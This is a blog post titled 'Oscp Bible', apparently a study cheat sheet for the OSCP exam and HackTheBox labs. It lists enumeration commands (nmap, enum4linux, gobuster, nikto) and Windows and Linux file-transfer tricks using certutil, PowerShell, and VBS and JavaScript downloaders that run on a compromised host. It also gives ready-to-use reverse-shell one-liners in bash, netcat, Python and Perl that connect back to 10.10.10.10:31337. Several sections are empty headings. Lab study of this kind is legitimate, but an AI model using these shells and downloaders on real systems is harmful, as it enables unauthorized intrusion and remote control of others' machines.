---
# Documentation: https://sourcethemes.com/academic/docs/managing-content/

title: "Oscp Bible"
subtitle: "A Collection of Helpful Information"
summary: ""
authors: []
tags: ["oscp","htb"]
categories: ["oscp","security","hackthebox"]
date: 2019-09-14T12:38:11-04:00
lastmod: 2019-09-14T12:38:11-04:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---
{{% toc %}}

---
# Enumeration
## Nmap

  - Quick TCP Scan

```bash
nmap -sC -sV -vv -oN quick 10.10.10.10
```

  - Quick TCP Scan

```bash
nmap -sU -sV -vv -oN quick_udp 10.10.10.10
```

  - Full TCP Scan

```bash
nmap -sC -cV -p- -vv -oN full 10.10.10.10
```

## Banner Grabbing

  - Netcat Banner Grab

```bash
nc -v 10.10.10.10 <port>
```

  - Telnet Banner Grab

```bash
telnet 10.10.10.10 <port>
```

## SMB

  - Nmap Vulnerability Scan

```bash 
nmap -p 139,445 -vv --script=smb-vuln* 10.10.10.10
```

  - Nmap User and Share Scan

```bash
nmap -p 139,445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10
```

  - Enum4linux

```bash
enum4linux -a 10.10.10.10
```
{{% alert note %}}
This tool can be tempermental with newer versions of kali, it is recommended that you use the VM provided for the PWK course for this.
{{% /alert %}}

  - Null Connection Test

```bash
rpcclient -U "" 10.10.10.10
```

  - Connecting to a client

```bash
smbclient //MOUNT/share
```
  - Getting the version of Samba:
  
```bash
# Originally from: https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#enum4linux
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
sleep 0.5 && echo ""
```
## SNMP

  - snmp-check

```bash
snmp-check 10.10.10.10
```

## Web Scanning
  - quick directory busting scan with gobuster

```bash
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10:<port> -s 200,204,301,302,307,403,500 -e -k -t 50 -np -o gobuster_quick_scan.txt 
```
  - targeting specific extensions with gobuster

```bash
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10:<port> -s 200,204,301,302,307,403,500 -e -k -t 50 -np -o gobuster_quick_scan.txt -x .txt,.php
```
  
  - Nikto

```bash
nikto -h http://10.10.10.10:<port>
```
{{% alert note %}}
if the endpoint you are scanning is using ssl, but has an invalid certificate this scan will not work.
{{% /alert %}}

  - WordPress Scan

```bash
wpscan -u 10.10.10.10 port
```

## Oracle Databases

  - Oscanner
  
```bash
oscanner -s 10.10.10.10. -p 1521
```
---
# File Transferring

## Via NetCat
  - Using NetCat

```bash
#On the Receiving Machine
nc -l -p 9999 > received_file.txt

#On the Sending Machine
nc 10.10.10.10 9999 < received_file.txt
```
 

## Via FTP

  - Using FTP

```bash
# In Kali
pip install pyftplib
python -m pyftpdlib -p 21 -w

# In reverse shell
echo open 10.10.10.10 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```

  - Using TFTP

```bash
# In Kali
atftpd --daemon --port 69 /tftp

# In reverse shell
tftp -i 10.10.10.10 GET file.txt
```

## Via HTTP

  - Using basic commands

```bash
# In Kali
python -m SimpleHTTPServer 80

# In reverse shell - Linux
wget 10.10.10.10/file

# In reverse shell - Windows
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
```

  - Using VBS (Windows)

```bash
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.10.10.10/file.exe file.exe
```

  - Using javascript (Windows)

```bash
# In Kali
python -m SimpleHTTPServer 80 

# In reverse shell
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); >> wget.js
echo WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); >> wget.js
echo WinHttpReq.Send(); >> wget.js
echo BinStream = new ActiveXObject("ADODB.Stream"); >> wget.js
echo BinStream.Type = 1; >> wget.js
echo BinStream.Open(); >> wget.js
echo BinStream.Write(WinHttpReq.ResponseBody); >> wget.js
echo BinStream.SaveToFile("file.txt"); >> wget.js

cscript /nologo wget.js http://10.10.10.10/file.txt
```

  - Using Certutil (Windows)

```bash
# In Kali
python -m SimpleHTTPServer 80

# In reverse shell
certutil.exe -urlcache -split -f "http://10.10.10.10/file.txt" file.txt
```

---
# Reverse Shells
## Catching Reverse Shells
  - Because metasploit usage is limited in the exam, we will stick to basic NetCat receivers

```bash
nc -nvlp 31337
```
{{% alert note %}}
On some machines you will find that outbound traffic is whitelisted to certain ports. If your reverse shell isn't reaching the NetCat listener, try using a port such as 443 that is less likely to be blocked.
{{% /alert %}}


## Using Tools Present
{{% alert note %}}
While these examples are tailored to Unix systems, some of these will also work by substituting `/bin/bash` with `cmd.exe`
{{% /alert %}}

  - Bash

```bash
bash -i >& /dev/tcp/10.10.10.10/31337 0>&1
```

  - Netcat without -e flag

```bash 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 31337 >/tmp/f
```

  - Netcat with -e flag

```bash
nc -e /bin/bash 10.10.10.10 31337
```

  - Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
  
  - Perl

```bash
perl -e 'use Socket;$i="10.10.10.10";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

  - Xterm

```bash
#On target system
xterm -display 10.10.10.10:1

#On Kali
Xnest :1
xhost +<targetip>
```

## Using MSFVenom 

  ---
# Privilege Escalation

---
# Scripts

  - Using python to send requests to outdated or self signed SSL Certs 

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL'

r = requests.post("https://10.10.10.10/form.php",data={'ID':'1004'},verify=False)
print(r.text)
```

---
# Web Application Testing

---
# Useful Commands
## Linux

  - List all open ports

```bash
netstat -alnp
```

  - SSh Tunneling though a host

```bash
# This will allow us to connect to port 31337 on our local machine and hit a service running on the target machine's port 5432, with our traffic coming from the ip 127.0.0.1
# This is extremely useful when a service does not allow external connections.
ssh -L31337:127.0.0.1:5432 username@10.10.10.10

#If your user is not permitted ssh access and only sftp access, use the -N flag:
ssh -N -L31337:127.0.0.1:5432 username@10.10.10.10
```

  - Getting a fully interactive shell with python

```bash
# Enter while in reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'

Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```
  - Measure the amount of network bandwidth with iptables

```bash
$ iptables -I INPUT 1 -s 10.10.10.10 -j ACCEPT
$ iptables -I OUTPUT 1 -d 10.10.10.10 -j ACCEPT
$ iptables -Z
$ nmap -sT 10.10.10.10
.
.
.
.
$ iptables -vn -L
```
